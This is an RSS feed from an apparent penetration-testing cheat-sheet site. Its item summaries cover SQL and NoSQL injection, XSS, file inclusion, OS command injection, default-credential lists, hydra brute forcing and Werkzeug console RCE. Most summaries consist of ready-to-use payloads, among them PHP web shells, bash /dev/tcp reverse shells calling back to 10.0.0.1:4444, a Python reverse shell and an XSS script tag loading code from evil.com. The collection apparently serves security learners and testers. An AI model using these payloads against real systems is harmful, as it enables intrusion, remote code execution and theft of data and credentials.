<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Web on D0CUM3NTN4T10N</title>
    <link>https://documentnation.github.io/tags/web/</link>
    <description>Recent content in Web on D0CUM3NTN4T10N</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Sat, 23 Dec 2023 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://documentnation.github.io/tags/web/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Anonymize Traffic with Tor</title>
      <link>https://documentnation.github.io/docs/hdks/network/attack/anonymize-traffic-with-tor/</link>
      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/attack/anonymize-traffic-with-tor/</guid>
      <description>Privacy Friendly OS link Tails Qubes Whonix Anonymization link1. Configure Proxychains linkFirst off, find the location of the proxychains configuration file.&#xA;find / -type f -name &amp;#34;*proxychains*&amp;#34; 2&amp;gt;/dev/null Assume we found /etc/proxychains.conf then modify this file.&#xA;vim /etc/proxychains We need to remove # in front of dynamic_chains, then comment out the strict_chain line and the random_chain line.&#xA;In addition, check the proxy_dns is uncommented for avoiding our DNS to be leaked.</description>
    </item>
    <item>
      <title>Elasticsearch Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/elasticsearch/elasticsearch-pentesting/</link>
      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/elasticsearch/elasticsearch-pentesting/</guid>
      <description>Default Credentials link admin:elasticadmin elastic:changeme Brute Force Credentials linkCrack the &amp;ldquo;Authorization&amp;rdquo; header in the web page.&#xA;hydra -L usernames.txt -P passwords.txt &amp;lt;target-ip&amp;gt; -s 9200 http-get / Common Directories link /_cat/ /_cat/indices /_cluster/ /_nodes/ /_remote/ /_security /_search?q=username /_search?q=password /_security/role /_security/user /_xpack/security/user/ </description>
    </item>
    <item>
      <title>Web Content Discovery</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/web-content-discovery/</link>
      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/web-content-discovery/</guid>
      <description>Manual Discovery link # Settings files /robots.txt /security.txt /.well-known/security.txt /.well-known/apple-app-site-association /.well-known/assetlinks.json /sitemap.xml /sitemaps.xml # JavaScript files /main.js /script.js /js/jquery.min.js /js/main.js /js/script.js # CGI scripts /cgi-bin/example.cgi # Wave dashes /~files/ /~hidden/ # PHP files /index.php /config.php /403.php /404.php # Python files /main.py /module.py /module/__init__.py /modules/__init__.py __init__.py config.ini project.wsgi # Archives /example.zip /backup.zip /backups.zip # Backup files /example.bak /example.jpg.bak /images/example.jpg.bak # Directories /admin/ /blog/ # Sensitive information /.env # GitHub /README.md /.git /.</description>
    </item>
    <item>
      <title>SQL Injection Cheat Sheet</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-cheat-sheet/</link>
      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-cheat-sheet/</guid>
      <description>Comment Syntax linkComment syntax is depending on the database used in the website.&#xA;MSDB Comments MySQL -- - (add a space after --) # /*comment*/ /*!comment*/ MSSQL -- /*comment*/ Oracle -- PostgreSQL -- /*comment*/ SQLite -- /*comment*/ Basic Injection linkFirst off, check if we can inject SQL commands into forms or URL params in the target website.&#xA;&amp;#39; OR 1=1-- &amp;#39; OR 1=1-- - &amp;#39; OR 1=1# &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- - &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;# &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1-- &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1-- - &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1# &amp;#34; OR 1=1-- &amp;#34; OR 1=1-- - &amp;#34; OR 1=1# &amp;#39;) OR 1=1-- &amp;#39;) OR 1=1-- - &amp;#39;) OR 1=1# &amp;#39;; OR 1=1-- &amp;#39;; OR 1=1-- - &amp;#39;; OR 1=1# admin or 1=1-- admin or 1=1-- - admin or 1=1# WAF Bypass linkReference: https://owasp.</description>
    </item>
    <item>
      <title>Web Login Bypass</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/web-login-bypass/</link>
      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/web-login-bypass/</guid>
      <description>Common Default Credentials linkCheck if the website has not changed credential from the default username/password.&#xA;admin:admin admin:password admin:password1 admin:password123 admin:passw0rd admin:(empty) admin:12345 administrator:password administrator:password1 administrator:password123 administrator:passw0rd administrator:(empty) administrator:12345 # phpIPAM admin:ipamadmin Admin:ipamadmin # PHPMyAdmin root:(null) root:password SQL Injections link &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1 &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1-- or true-- &amp;#39; or true-- UNION SELECT null-- &amp;#39; UNION SELECT null-- &amp;#39; UNION SELECT 1,2-- Microsoft, Oracle, PostgreSQL link &amp;#39;-- &amp;#39; or 1=1-- &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- }&amp;#34; or 1=1-- MySQL link &amp;#39;-- - &amp;#39;# &amp;#39; or 1=1# &amp;#39; or 1=1-- - &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- - &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;# }&amp;#34; or 1=1-- - NoSQL Injection linkReference: https://portswigger.</description>
    </item>
    <item>
      <title>Burp Suite Troubleshooting</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/burp-suite-troubleshooting/</link>
      <pubDate>Tue, 28 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/burp-suite-troubleshooting/</guid>
      <description>Fix Error “Failed to connect to x.x.x.x:443” linkIf we try to HTTP access rather than HTTPS, This error occurs because the Burp’s embedded browser uses secure connections automatically by default.&#xA;If we got the error, we may be able to solve the problem by the following methods:&#xA;In the embedded browser, open Settings by clicking on three dots menu icon. Once Settings screen opens, go to “Privacy and security” → “Security”.</description>
    </item>
    <item>
      <title>XSS (Cross-Site Scripting)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xss/</link>
      <pubDate>Tue, 28 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xss/</guid>
      <description>Payloads linkWe can insert them into URL params, POST params or HTTP headers.&#xA;Additionary, we can also find CVE related XSS here.&#xA;Script Tags link &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#39;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;onerror=alert;throw 123&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;{onerror=alert}throw 123&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;throw onerror=alert,&amp;#39;hello&amp;#39;,123,&amp;#39;world&amp;#39;&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;fetch(&amp;#39;/profile?new_password=password&amp;#39;);&amp;lt;/script&amp;gt; &amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; %3Cscript%3Ealert%281%29%3C%2Fscript%3E &amp;#39;;alert(1);&amp;#39; In addition, we may be able to execute our JavaScript file which is hosted on our server.&#xA;&amp;lt;script src=&amp;#34;https://evil.com/evil.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; Img Tags link &amp;#34; src=1 onerror=alert(1)&amp;gt; &amp;lt;&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;#34;&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;lt;img src=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav&amp;amp;#x09;ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav&amp;amp;#x0A;ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img dynsrc=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img lowsrc=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=http://10.</description>
    </item>
    <item>
      <title>Web Reverse Shell</title>
      <link>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</link>
      <pubDate>Tue, 21 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</guid>
      <description>PHP Reverse Shell (Linux) link # From local script (it&amp;#39;s stored by default in Kali or Parrot) cp /usr/share/webshell/php/php-reverse-shell.php ./shell.php # From repo (https://github.com/pentestmonkey/php-reverse-shell) wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php # From repo (https://github.com/flozz/p0wny-shell) wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O shell.php Replace the $ip and the $port in the script with your local ip and port.&#xA;Without fsockopen, and for FreeBSD link &amp;lt;?php set_time_limit (0); $ip = &amp;#39;10.0.0.1&amp;#39;; // CHANGE THIS $port = 4444; // CHANGE THIS // Spawn shell process $descriptorspec = array( 0 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;r&amp;#34;), // stdin is a pipe that the child will read from 1 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;w&amp;#34;), // stdout is a pipe that the child will write to 2 =&amp;gt; array(&amp;#34;file&amp;#34;, &amp;#34;/tmp/error-output.</description>
    </item>
    <item>
      <title>Broken Access Control</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/broken-access-control/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/broken-access-control/</guid>
      <description>Change Header Values linkCookie linkWe may be able to get access to the login-required pages.&#xA;Cookie: admin=true Cookie: isAdmin=true Cookie: access=1 Cookie: access=true # Insert another user value Cookie: session=&amp;lt;another_user_value&amp;gt; Cookie: access_token=&amp;lt;another_user_value&amp;gt; IP Spoofing link Cluster-Client-IP: 127.0.0.1 Forwarded-For: 127.0.0.1 X-Forwarded: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Original-URL: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-ProxyUser-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Remote-IP: 127.0.0.1 Host: 127.0.0.1 User Agent linkSometimes we can access another server by replacing the User Agent with the specific one.</description>
    </item>
    <item>
      <title>Bypass Client/Server Side Filter</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/bypass-client-server-side-filter/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/bypass-client-server-side-filter/</guid>
      <description>1. Disable Filter linkDisable Client-Side (JS) Filter link In Burp Suite, go to Proxy tab and click Options. Navigate to Intercept Client Requests section, then click on the top line (File extension&amp;hellip;) then click Edit. The popup will open. In the popup, find and remove |^js$ in Match condition, then save the filter. Disable Server-Side Filter link In Burp Suite, go to Proxy tab and click Options. Navigate to Intercept Server Requests section and check Intercept responses based on&amp;hellip;.</description>
    </item>
    <item>
      <title>File Upload Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack/</guid>
      <description>Check Allowed File Formats linkFirst off, we need to know what file types are allowed to be uploaded in target website.&#xA;Try to upload any formats.&#xA;.php, .php3, .php4, .php5, .phtml, .phar .jpg, jpeg, .png, .gif .bmp .pdf .js .exe, .dll, .asp, .aspx .py .go .rs Create Blank Files for Each Format linkTo create a blank file for the checking purpose, execute the following command.&#xA;jpg, png # https://superuser.com/questions/294943/is-there-a-utility-to-create-blank-images convert -size 32x32 xc:white test.</description>
    </item>
    <item>
      <title>OS Command Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/os-command-injection/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/os-command-injection/</guid>
      <description>Basic Payloads linkIf the payload includes whitespaces (&amp;rsquo; &amp;lsquo;), we need to change it to &amp;rsquo;+&amp;rsquo; or URL encoding (&amp;rsquo;%20&amp;rsquo;).&#xA;/api/cmd/whoami /command/whoami /?cmd=whoami /?cmd=;id /?cmd=ls /?cmd=ls .. /?cmd=ls ../ /?cmd=ls /home /?cmd=`ping -c 1 10.0.0.1` /?file=example.txt; echo $(ls -al /) /?file=example.txt; echo $(ls -al /) | &amp;lt;!-- PHP query string --&amp;gt; /?q=;system($_GET[cmd])&amp;amp;cmd=whoami /?q=${system($_GET[cmd])}&amp;amp;cmd=whoami /?productId=1&amp;amp;stockId=1|whoami /?productId=1&amp;amp;stockId=1|id &amp;lt;!-- Windows --&amp;gt; /?file=example.txt | systeminfo # /?file=example.txt ; systeminfo # /?file=example.txt&amp;#39;) ; systeminfo # URL Encoding linkWe may be able to bypass specific character filter by encoding them.</description>
    </item>
    <item>
      <title>Web Basic Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/web-basic-pentesting/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/web-basic-pentesting/</guid>
      <description>Enumeration link # Nmap nmap --script http-auth --script-args http-auth.path=/login -p 80,443 &amp;lt;target-ip&amp;gt; nmap --script http-devframework -p 80,443 &amp;lt;target-ip&amp;gt; nmap --script http-enum -p 80,443 &amp;lt;target-ip&amp;gt; nmap --script http-headers -p 80,443 &amp;lt;target-ip&amp;gt; nmap --script http-methods -p 80,443 &amp;lt;target-ip&amp;gt; # WHOIS whois example.com # Nikto nikto -h http://&amp;lt;target-ip&amp;gt; # -p: Specify ports nikto -p 80,3000 -h &amp;lt;target-ip&amp;gt; # -T: Tuning # 1: Interesting files # 2: Misconfiguration # 3: Information Disclosure # 4: Injection (XSS/Script/HTML) nikto -T 1 2 3 -h &amp;lt;target-ip&amp;gt; # -useragent: Custom user agent nikto -useragent &amp;lt;user-agent&amp;gt; -h &amp;lt;target-ip&amp;gt; # -e: IDS evasion # 1: Random URI encoding # 7: Change the case of URL nikto -e 1 7 -h &amp;lt;target-ip&amp;gt; # Whatweb whatweb &amp;lt;target-ip&amp;gt; # Aggression level (1-4) whatweb -a 3 &amp;lt;target-ip&amp;gt; # List all plugins whatweb -l # Search plugins whatweb -I apache whatweb -I phpBB whatweb -I phpmyadmin whatweb -I windows # Use plugin whatweb -p phpBB &amp;lt;target-ip&amp;gt; SSL Certificate linkIt may contain the sensitive information about the target company.</description>
    </item>
    <item>
      <title>Web Registration Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/web-registration-attack/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/web-registration-attack/</guid>
      <description>Register with the Same Username/Email Address as Existing User linkWe might be able to register the same username/email address as the existing user. It may affect the web server so be careful when testing.&#xA;Here are examples of username to register.&#xA;admin administrator root Alternatively, it’s worth to try various approach to register.&#xA;# Insert null byte admin%00 # Insert a space before username admin %20admin # Insert a space after username admin admin%20 # Insert spaces around username admin %20admin%20 # Overflow (we need to find the longest characters that can be registered) xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxadmin Malicious Usernames linkXSS linkWe might be able to inject XSS in username when registration.</description>
    </item>
    <item>
      <title>OSINT (Open Source Intelligence)</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/osint/</link>
      <pubDate>Fri, 03 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/osint/</guid>
      <description>Automation linkOSINT is a powerful method for investigating target organizations, websites, etc. However, it&amp;rsquo;s the tedious task to surfin the internet for finding desired information one by one. For that reason, it&amp;rsquo;s also recommended to use automation tools.&#xA;*It might overlap a bit with recon automation tools&#xA;BBOT&#xA;A powerful subdomain scanner and port mapper.&#xA;Blackbird&#xA;Searches accounts by username in social networks.&#xA;Maltego&#xA;A comprehensive tool for information gathering.</description>
    </item>
    <item>
      <title>SSRF (Server-Side Request Forgery)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/ssrf/</link>
      <pubDate>Wed, 18 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/ssrf/</guid>
      <description>SSRF Capture Tools linkIf we want to capture incoming requests from target website/server, there is a lot of open-source tools available.&#xA;Ngrok linkhttps://ngrok.com/&#xA;To start ngrok server, run the following.&#xA;ngrok http 80 # Force http scheme (not https) ngrok http --scheme=http 8090 --host-header=localhost:8090 Then start your local web server for fetching requests forwarded from the ngrok server.&#xA;sudo python3 -m http.server 80 # or python3 -m http.server 8090 After starting ngrok and local web server, we can use the URL such as https://abcd-12-3-45-678.</description>
    </item>
    <item>
      <title>SSTI (Server-Side Template Injection)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/ssti/</link>
      <pubDate>Wed, 18 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/ssti/</guid>
      <description>Automation linkTplmap is a program for Server-Side Template Injection and Code Injection.&#xA;./tplmap.py -u http://vulnerable.com/?name=test Identify the Template Engine/Framework/Language link Payload Template Engine/Framework/Language a{*comment*}b Smarty #{ 2*3 } Pug, Spring *{ 2*3 } Spring ${&amp;quot;z&amp;quot;.join(&amp;quot;ab&amp;quot;)} Mako, ??? {{ &#39;7&#39;*7 }} Angular, Django, Flask, Go, Jinja2, Tornado, Twig, ??? {{:2*3}} JsRender {% debug %} Django SSTI for Each Framework linkPlease see each article for details about SSTI.&#xA;Angular Django Flask/Jinja2 Go JsRender Pug Spring Tornado </description>
    </item>
    <item>
      <title>Web Cache Poisoning</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/web-cache-poisoning/</link>
      <pubDate>Wed, 18 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/web-cache-poisoning/</guid>
      <description>Reflected XSS with Cache Poisoning linkIf the website reflects our arbitrary path in the result such as below.&#xA;https://example.com/xyz # Output in the 404 page Page not found: /xyz We may try XSS as below.&#xA;https://example.com/xyz&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; If we use Burp Repeater to send the request above, the URL won&amp;rsquo;t be normalized so leads the reflected XSS. Then the cache will be poisoned. In this state, if you ask the victim to visit this URL, they will see this cached result.</description>
    </item>
    <item>
      <title>Go SSTI</title>
      <link>https://documentnation.github.io/docs/hdks/web/go-ssti/</link>
      <pubDate>Sat, 14 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/go-ssti/</guid>
      <description>Investigation link import &amp;#34;html/template&amp;#34; ... template.New(&amp;#34;foo&amp;#34;).Parse(&amp;#34;{{ . }}&amp;#34;) If a website uses a web framework written in Golang and uses html/template module for parsing a template file or strings, we may inject this template with our custom template file/string.&#xA;Exploit linkAssume a web application defines User struct, GetFile method, and ExecuteCmd method.&#xA;// `main.go` of target website type User struct { Id string Name string } // Read contents of the file and output it.</description>
    </item>
    <item>
      <title>HTTP Request Smuggling</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/http-request-smuggling/</link>
      <pubDate>Sat, 14 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/http-request-smuggling/</guid>
      <description>Investigation linkAssume the website has the following HTTP specification.&#xA;POST /login HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Content-Length: 29 username=admin&amp;amp;password=admin If we change &amp;ldquo;Content-Length&amp;rdquo; to &amp;ldquo;Transfer-Encoding&amp;rdquo; as follow, the data is sent in chunks to server. Each chunk consists of the chunk size in bytes (it is expressed in hexadecimal).&#xA;The message is terminated with a chunk of size zero.&#xA;POST /login HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Transfer-Encoding: chunked 1d username=admin&amp;amp;password=admin 0 By the way, Transfer-Encoding header is not allowed in HTTP/2.</description>
    </item>
    <item>
      <title>Web Server Security Misconfiguration</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/web-server-security-misconfiguration/</link>
      <pubDate>Thu, 12 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/web-server-security-misconfiguration/</guid>
      <description>Checklist link The admin page allows non-admin users to access. Directory listing is enabled. Test environment is public. Default username and password. Admin’s password is easy to guess e.g. &amp;ldquo;admin&amp;rdquo;, &amp;ldquo;password123&amp;rdquo;, etc. The software is out of date or vulnerable version. Attacker-friendly error messages are displayed e.g. it reveals the software version. A cloud service provider (CSP) has default sharing permissions. Unsecure http protocol is used rather than https. Check CSP (Content-Security-Policy) linkWe can check if the CSP is vulnerable or not using online tools as below.</description>
    </item>
    <item>
      <title>API Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/api/</link>
      <pubDate>Wed, 11 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/api/</guid>
      <description>API Subdomains Discovery linkReference: https://infosecwriteups.com/how-to-discover-api-subdomains-api-hacking-41ef91d00846&#xA;api.example.com # with another subdomain sub.api.example.com api.sub.example.com # Versions v1.api.example.com v2.api.example.com api.v1.example.com api.v2.example.com Google Dorks link site:*.api.example.com site:api.*.example.com # Random domains site:*.api.*.* site:api.*.*.* site:*.api.*.com site:api.*.*.com site:*.api.*.gov site:api.*.*.gov Automation link subfinder -d example.com | grep api Below fuzz target web server directly so be careful when doing that.&#xA;ffuf -u https://FUZZ.api.example.com -w wordlist.txt ffuf -u https://api/FUZZ.example.com -w wordlist.txt Change Methods link # Methods GET, POST, PUT, DELETE, OPTIONS, HEAD, PATCH, INVENTED Endpoint Discovery linkTry to enumerate endpoints while changing HTTP methods like GET, POST, OPTIONS, etc.</description>
    </item>
    <item>
      <title>NoSQL Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/nosql-injection/</link>
      <pubDate>Thu, 05 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/nosql-injection/</guid>
      <description>Manual Injection linkSee also Web Login Bypass NoSQL Injection.&#xA;Mongo linkIf the web application uses MongDB, you might be able to fetch the user&amp;rsquo;s information.&#xA;It allows you to bypass authentication.&#xA;/?username=admin&amp;amp;password[$ne]=xyz /?username[$ne]=admin&amp;amp;role=guest /?id[$gt]=1&amp;amp;username=john Syntax&#xA;Below are the payloads to syntax injection. Don’t forget to try the URL-encoded payloads.&#xA;test||1==1 test%7C%7C1%3D%3D1 test||1==1// test%7C%7C1%3D%3D1%2F%2F test||1==1%00 test%7C%7C1%3D%3D1%2500 test||1==1\u0000 test%7C%7C1%3D%3D1%5Cu0000 test||&amp;#39;1==1 test%7C%7C%271%3D%3D1 test||&amp;#39;1&amp;#39;==&amp;#39;1&amp;#39; test%7C%7C%271%27%3D%3D%271%27 test||&amp;#39;1&amp;#39;==&amp;#39;1 test%7C%7C%271%27%3D%3D%271 test&amp;#39;||1||&amp;#39; test%27%7c%7c%31%7c%7c%27 &amp;lt;!-- Find specific fields e.g. &amp;#39;password&amp;#39; --&amp;gt; admin&amp;#39; &amp;amp;&amp;amp; this.</description>
    </item>
    <item>
      <title>PHP RCE Cheat Sheet</title>
      <link>https://documentnation.github.io/docs/hdks/web/php-rce-cheat-sheet/</link>
      <pubDate>Thu, 05 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/php-rce-cheat-sheet/</guid>
      <description>Web Shell link &amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]);?&amp;gt; &amp;lt;?php echo system($_GET[&amp;#39;cmd&amp;#39;]);?&amp;gt; &amp;lt;%3fphp&amp;#43;system($_[&amp;#39;cmd&amp;#39;]);%3f&amp;gt; &amp;lt;%3fphp&amp;#43;echo&amp;#43;system($_[&amp;#39;cmd&amp;#39;]);%3f&amp;gt; We can access to /?cmd=whoami.&#xA;Reverse Shell link &amp;lt;?php system(&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39;);?&amp;gt; &amp;lt;?php system(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;);?&amp;gt; &amp;lt;%3fphp&amp;#43;system(&amp;#39;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;%2fdev%2ftcp%2f10.0.0.1%2f4444&amp;#43;0&amp;gt;%261&amp;#39;);%3f&amp;gt; &amp;lt;%3fphp&amp;#43;system(&amp;#39;bash&amp;#43;-c&amp;#43;&amp;#34;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;%2fdev%2ftcp%2f10.0.0.1%2f4444&amp;#43;0&amp;gt;%261&amp;#34;&amp;#39;);%3f&amp;gt; </description>
    </item>
    <item>
      <title>File Inclusion (LFI/RFI)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/file-inclusion/</link>
      <pubDate>Mon, 02 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/file-inclusion/</guid>
      <description>Local File Inclusion (LFI) link ?page=../ ?page=/etc/passwd ?page=../../../../etc/passwd ?page=../../../../../etc/passwd ?page=..//..//..//..//..//etc/passwd ?page=....//....//....//....//etc/passwd ?page=....//....//....//....//....//....//etc/passwd ?page=.....///.....///.....///.....///etc/passwd ?page=../../../../../../../../../../../../../../etc/passwd ?page=..\/..\/..\/..\/etc/passwd ?page=/etc/passwd&amp;amp; ?page=/etc/passwd%00 ?page=example.php%00.txt ?page=/etc/passwd%00.inc ?page=/etc/passwd%00.php ?page=http://localhost/index ?page=http://localhost:3000/index.html ?page=http://localhost:8000/index.html ?page=somedir/../../../../etc/passwd&amp;amp;ext= # URL encoding ?page=..%2F..%2F..%2F..%2Fetc/passwd ?page=..%5C..%5C..%5C..%5Cetc/passwd ?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd ?page=http:%5C%5Cindex # URL double encoding ?page=..%252F..%252F..%252F..%252fetc/passwd ?page=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd ?page=http:%252F%252Findex # UTF-8 encoding ?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd # Dot truncation ?page=../../../../etc/passwd.......................................................... # File scheme ?page=file:///etc/passwd ?page=file:%2F%2F%2Fetc%2Fpasswd ?page=file:%252F%252F%252Fetc%252Fpasswd ?page=file%3A///etc/passwd ?page=file%3A%2F%2F%2Fetc%2Fpasswd ?page=file%3A%252F%252F%252Fetc%252Fpasswd ?page=file://var/www/html/index.php ?page=file://var/www/&amp;lt;subdomain&amp;gt;/index.php # Other local web servr ?page=http://127.0.0.1/ ?page=http://127.0.0.1:3000/ ?page=http://127.0.0.1:8000/ # PHP Filter ?page=php://filter/resource=/etc/passwd ?page=php://filter/read=string.rot13/resource=index.php ?</description>
    </item>
    <item>
      <title>Werkzeug Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/werkzeug-pentesting/</link>
      <pubDate>Mon, 02 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/werkzeug-pentesting/</guid>
      <description>SSTI linkPlease see Flask Jinja2 SSTI&#xA;Remote Code Execution (RCE) in Console linkMetasploit link msfconsole msf&amp;gt; use exploit/multi/http/werkzeug_debug_rce Manual Exploitation linkIf we can access to /console page, we may be able to execute RCE.&#xA;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;whoami&amp;#39;).read(); import os; print(os.popen(&amp;#34;whoami&amp;#34;).read()) # Reverse shell __import__(&amp;#39;os&amp;#39;).popen(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;).read() Console PIN Exploit linkReference: https://www.daehee.com/werkzeug-console-pin-exploit/&#xA;If the website is locked by PIN code in the /console page, you need to unlock it.</description>
    </item>
    <item>
      <title>Flask Jinja2 Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/flask-jinja2-pentesting/</link>
